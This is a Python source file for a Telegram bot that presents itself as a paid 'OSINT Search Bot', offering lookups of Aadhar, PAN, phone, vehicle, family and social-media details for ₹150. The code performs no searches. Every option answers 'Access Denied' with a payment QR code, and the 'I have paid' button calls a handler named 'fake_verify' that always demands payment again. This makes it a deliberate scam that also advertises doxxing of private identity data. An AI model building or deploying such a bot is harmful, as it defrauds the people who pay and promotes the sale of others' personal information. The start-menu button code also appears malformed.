import os
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
QR_URL = "https://i.ibb.co/zH7n458d/IMG-20260710-WA0005.jpg"
application = Application.builder().token(BOT_TOKEN).build()

# ========== COMMANDS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    buttons = [
        ["📱 Instagram", "instagram"],
        ["💳 UPI", "upi"],
        ["📞 Number", "number"],
        ["🆔 TG ID", "tg_id"],
        ["👤 TG Username", "tg_username"],
        ["🚗 Vehicle", "vehicle"],
        ["👨‍👩‍👧‍👦 Family", "family"],
        ["🪪 PAN", "pan"],
        ["🪪 Aadhar", "aadhar"],
        ["🏢 HiTek", "hitek"],
        ["📱 Paytm", "paytm"],
        ["📘 Facebook", "facebook"],
        ["👻 Snapchat", "snapchat"]
    ]
    await update.message.reply_text(
        "🔍 OSINT Search Bot\n\nSelect an option:\n\n⚠️ Paid Service: ₹150\n✅ Lifetime Access\n♾️ Unlimited Searches",
        reply_markup=InlineKeyboardMarkup(buttons)
    )

async def handle_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    category = query.data
    
    if category == "fake_verify":
        await context.bot.send_message(user.id, f"❌ Access Denied\n\nPayment not found.\nPay ₹150 again.")
        await context.bot.send_photo(user.id, QR_URL, caption="Pay ₹150 to unlock")
        return
    
    await context.bot.send_message(user.id, f"🔒 Access Denied\n\nPay ₹150 to unlock {category}.")
    await context.bot.send_photo(user.id, QR_URL, caption="Scan to pay ₹150")
    await context.bot.send_message(user.id, "After payment, click below:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ I have paid", callback_data="fake_verify")]]))

# ========== WEBHOOK ==========
application.add_handler(CommandHandler("start", start))
application.add_handler(CallbackQueryHandler(handle_selection, pattern="^(instagram|upi|number|tg_id|tg_username|vehicle|family|pan|aadhar|hitek|paytm|facebook|snapchat|fake_verify)$"))

@app.route(f"/{BOT_TOKEN}", methods=["POST"])
async def webhook():
    update = Update.de_json(request.get_json(), application.bot)
    await application.process_update(update)
    return "ok"

@app.route("/")
def home():
    return "Bot is running!"

@app.route("/health")
def health():
    return "OK"

@app.route("/setwebhook")
def set_webhook():
    webhook_url = f"{os.environ.get('RENDER_EXTERNAL_URL')}/{BOT_TOKEN}"
    application.bot.set_webhook(webhook_url)
    return f"Webhook set to {webhook_url}"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
